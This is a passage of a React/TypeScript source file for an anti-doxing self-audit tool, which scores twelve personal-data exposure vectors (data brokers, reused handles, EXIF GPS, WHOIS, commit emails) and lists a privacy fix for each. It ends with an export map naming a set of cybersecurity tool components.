/* ============================================================================
 * 13. OSINT DOXING EXPOSURE SELF-AUDIT SIMULATOR
 * ========================================================================== */
const OSINT_VECTORS = [
  { id: "whois", weight: 12, label: "Custom Domain without WHOIS Privacy Redaction", fix: "Enable ICANN RDAP/WHOIS privacy proxy at registrar and rotate historical DNS SOA email." },
  { id: "username", weight: 10, label: "Single Handle Reused Across GitHub, Reddit, Discord & Forums", fix: "Compartmentalize handles by persona; audit current handle with Sherlock / Maigret." },
  { id: "breach-phone", weight: 14, label: "Primary Email Linked to Personal SIM Phone in HaveIBeenPwned Breaches", fix: "Migrate 2FA and account recovery to a non-VOIP secondary number or hardware FIDO2 YubiKey." },
  { id: "venmo-upi", weight: 9, label: "Public Venmo Feed / Personal Name Exposed on UPI VPA Lookup", fix: "Set Venmo/CashApp default transactions to Private and use bank-issued alias VPAs." },
  { id: "strava-exif", weight: 11, label: "Public Strava / Fitness GPS Heatmaps or Unstripped Photo EXIF GPS", fix: "Enable 500m Home/Work Privacy Zones on Strava and strip EXIF metadata via ExifTool before upload." },
  { id: "databrokers", weight: 14, label: "Listed on People-Search Brokers (Whitepages, Spokeo, TruePeopleSearch)", fix: "Submit manual opt-out takedowns on top 15 data brokers and freeze LexisNexis public profile." },
  { id: "git-email", weight: 8, label: "Personal Email Committed in Public GitHub `git log` History", fix: "Enable `users.noreply.github.com` commit address and enable push protection for private emails." },
  { id: "voter-prop", weight: 7, label: "Unredacted Home Address in Public Voter / LLC Corporate Registry", fix: "Use a Registered Agent + Virtual Mailbox PMB for all LLC filings and domain registrations." },
  { id: "password-reset", weight: 5, label: "Password Reset Pages Leak Partial Recovery Email (`a***h@gmail.com`) & Phone Digits", fix: "Use unique alias emails (SimpleLogin / Cloudflare Email Routing) per critical service." },
  { id: "wigle-bssid", weight: 4, label: "Home Wi-Fi SSID Contains Surname or Unique Identifier without `_nomap`", fix: "Rename SSID generically and append `_nomap` to opt out of commercial wardriving geolocation APIs." },
  { id: "discord-id", weight: 3, label: "Public Discord / Telegram Account Joined to Local City/University Servers", fix: "Use separate compartmentalized chat accounts for local community vs pseudonymous tech groups." },
  { id: "linkedin", weight: 3, label: "Public LinkedIn Profile Exposes Exact Team, Location & Badge Photos", fix: "Disable public profile visibility to logged-out scrapers and never post conference/office badge QR codes." },
];

function OsintDoxingExposureSelfAuditSimulator({ tool }: { tool: Tool }) {
  const { setOutput } = useToolCard();
  const [exposedIds, setExposedIds] = useState<string[]>(["username", "breach-phone", "databrokers", "git-email"]);

  const toggleVector = (id: string) => {
    setExposedIds((prev) => (prev.includes(id) ? prev.filter((x) => x !== id) : [...prev, id]));
  };

  const assessment = useMemo(() => {
    const active = OSINT_VECTORS.filter((v) => exposedIds.includes(v.id));
    const score = active.reduce((sum, v) => sum + v.weight, 0);
    const tier =
      score >= 55
        ? "CRITICAL DOXING EXPOSURE (Trivial 5-Minute Pivot to Physical Address)"
        : score >= 30
        ? "HIGH CORRELATION RISK (Cross-Platform Identity Linkable)"
        : score >= 12
        ? "MODERATE EXPOSURE (Isolated OSINT Breadcrumbs)"
        : "HARDENED OPSEC POSTURE (Compartmentalized Identity)";
    return { active, score, tier };
  }, [exposedIds]);

  useEffect(() => {
    setOutput(
      [
        `# Personal OSINT & Anti-Doxing Threat Assessment`,
        `Doxing Exposure Score: ${assessment.score}/100 — ${assessment.tier}`,
        `Active Exposure Vectors (${assessment.active.length}/12):`,
        ...assessment.active.map((v, i) => `${i + 1}. [Weight +${v.weight}] ${v.label}\n   Remediation: ${v.fix}`),
      ].join("\n")
    );
  }, [assessment, setOutput]);

  return (
    <div className="space-y-5">
      <div className="grid grid-cols-1 md:grid-cols-3 gap-3">
        <div className="rounded-xs border border-border bg-background p-4">
          <div className="text-[11px] font-heading font-bold uppercase tracking-wider text-text-muted">Doxing Exposure Score</div>
          <div
            className={`mt-1 font-mono-code text-3xl font-bold ${
              assessment.score >= 55 ? "text-red-400" : assessment.score >= 30 ? "text-amber-400" : "text-emerald-400"
            }`}
          >
            {assessment.score} / 100
          </div>
        </div>
        <div className="rounded-xs border border-border bg-background p-4 md:col-span-2 flex flex-col justify-center">
          <div className="text-[11px] font-heading font-bold uppercase tracking-wider text-text-muted">OSINT Correlation Verdict</div>
          <div className="mt-1 font-heading text-sm font-bold uppercase text-accent">{assessment.tier}</div>
          <div className="mt-2 flex gap-2">
            <button
              type="button"
              onClick={() => setExposedIds(OSINT_VECTORS.map((v) => v.id))}
              className="rounded-xs border border-border bg-surface px-2.5 py-1 font-heading text-[10px] font-bold uppercase text-text-muted hover:text-text cursor-pointer"
            >
              Select All 12 Vectors
            </button>
            <button
              type="button"
              onClick={() => setExposedIds([])}
              className="rounded-xs border border-border bg-surface px-2.5 py-1 font-heading text-[10px] font-bold uppercase text-emerald-400 hover:border-emerald-400 cursor-pointer"
            >
              Clear All (Hardened OPSEC)
            </button>
          </div>
        </div>
      </div>

      {/* 12-Vector Checklist */}
      <div className="grid grid-cols-1 md:grid-cols-2 gap-2.5">
        {OSINT_VECTORS.map((vec) => {
          const checked = exposedIds.includes(vec.id);
          return (
            <button
              key={vec.id}
              type="button"
              onClick={() => toggleVector(vec.id)}
              className={`rounded-xs border p-3 text-left transition cursor-pointer ${
                checked ? "border-red-500/60 bg-red-500/10" : "border-border bg-background hover:border-accent"
              }`}
            >
              <div className="flex items-start justify-between gap-2">
                <span className="font-heading text-xs font-bold text-text">{vec.label}</span>
                <span
                  className={`shrink-0 rounded-xs px-1.5 py-0.5 font-mono-code text-[10px] font-bold ${
                    checked ? "bg-red-500/30 text-red-300" : "bg-surface text-text-muted"
                  }`}
                >
                  +{vec.weight} pts
                </span>
              </div>
              {checked && <div className="mt-1.5 font-mono-code text-[11px] text-emerald-400">Fix: {vec.fix}</div>}
            </button>
          );
        })}
      </div>

      <ToolActions tool={tool} />
    </div>
  );
}

/* ============================================================================
 * EXPORT WAVE 3 CYBER PLAYGROUNDS (13 SLUGS)
 * ========================================================================== */
export const wave3CyberPlaygrounds: Record<string, React.ComponentType<{ tool: Tool }>> = {
  "deepfake-ela-image-forensics-inspector": DeepfakeElaImageForensicsInspector,
  "zero-upload-pdf-merger-sanitizer": ZeroUploadPdfMergerSanitizer,
  "live-bgp-asn-peering-looking-glass": LiveBgpAsnPeeringLookingGlass,
  "idn-homograph-punycode-phishing-detector": IdnHomographPunycodePhishingDetector,
  "zero-width-unicode-canary-trap-studio": ZeroWidthUnicodeCanaryTrapStudio,
  "modbus-mqtt-scada-iot-frame-builder": ModbusMqttScadaIotFrameBuilder,
  "tor-onion-v3-opsec-torrc-generator": TorOnionV3OpsecTorrcGenerator,
  "shamir-secret-sharing-bip39-splitter": ShamirSecretSharingBip39Splitter,
  "worm-epidemic-botnet-propagation-simulator": WormEpidemicBotnetPropagationSimulator,
  "snort-suricata-ids-rule-simulator": SnortSuricataIdsRuleSimulator,
  "sip-voip-ss7-telecom-attack-simulator": SipVoipSs7TelecomAttackSimulator,
  "evil-maid-luks-bitlocker-boot-simulator": EvilMaidLuksBitlockerBootSimulator,
  "osint-doxing-exposure-self-audit-simulator": OsintDoxingExposureSelfAuditSimulator,
};
